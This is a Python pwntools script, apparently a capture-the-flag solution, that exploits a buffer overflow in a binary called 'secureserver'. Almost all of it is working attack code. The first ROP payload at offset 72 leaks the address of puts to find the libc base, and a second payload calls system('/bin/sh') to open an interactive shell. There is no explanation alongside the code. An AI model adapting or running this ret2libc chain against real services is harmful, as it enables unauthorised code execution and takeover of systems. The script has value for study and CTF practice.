#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './secureserver'
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    # leak puts via puts
    offset = 72
    payload = flat({
        offset: [
            rop.rdi.address,
            elf.got['puts'],
            elf.plt['puts'],
            elf.symbols['main']
        ]
    })
    io.recvlines(2)
    io.sendline(payload)
    
    # get info
    leak = unpack(io.recvline().strip().ljust(8, b'\x00'))
    log.info("Puts address: %#x", leak)
    libc.address = leak - libc.symbols['puts']
    log.info("Libc base address: %#x", libc.address)

    # 2nd payload to get shell
    payload = flat({
        offset: [
            rop.rdi.address,
            next(libc.search(b'/bin/sh')),
            rop.ret.address,
            libc.symbols['system']
        ]
    })
    io.sendlineafter(b':', payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()